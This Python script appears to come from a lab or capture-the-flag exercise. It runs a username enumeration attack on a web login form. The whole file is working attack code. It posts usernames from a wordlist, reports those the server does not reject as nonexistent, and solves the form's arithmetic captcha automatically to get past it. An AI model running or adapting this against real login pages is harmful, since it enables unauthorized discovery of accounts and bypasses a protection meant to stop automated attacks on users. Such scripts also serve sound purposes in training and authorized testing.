#!/usr/bin/python3

import requests
import sys
import queue

# default credentials to test
user = "test"
password = "test_password"
cap = 1

url = sys.argv[1]

# the header is constant, no need to change in each iteration
headers0 = {"Host":"10.10.164.199",
	"Content-Type":"application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36",}
	
# prepare the queue
queue = queue.Queue()
with open("usernames.txt", "r") as file:
	for line in file:
		queue.put(line.strip())

# search the value "t" in the string "s" and return the entire line of "t" (used this to get the captcha)
def search(s, t):
    for line in s.split("\n"):
        if t in line:
            return line
    return 0

while not queue.empty():
	data0 = {"username":queue.get(),
	"password":password,
	"captcha":cap,}
	
	r = requests.post(url, headers = headers0, data = data0)
	cap_line = search(r.text, "?")	# the captcha is the only line with the symbol "?"
	print(r.text)
	if not "does not exist" in r.text:	# this will print the first try (site behaviour)
		print("FOUND +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+")
	print("-------------" * 5)
	
	# the cap line is like 483 + 58 = ?
	# make the math for the captcha
	cap_elements = cap_line.split()
	if cap_elements[1] == "+":
		cap = int(cap_elements[0]) + int(cap_elements[2])
	elif cap_elements[1] == "-":
		cap = int(cap_elements[0]) - int(cap_elements[2])
	elif cap_elements[1] == "*":
		cap = int(cap_elements[0]) * int(cap_elements[2])
	else:
		print("ERROR")
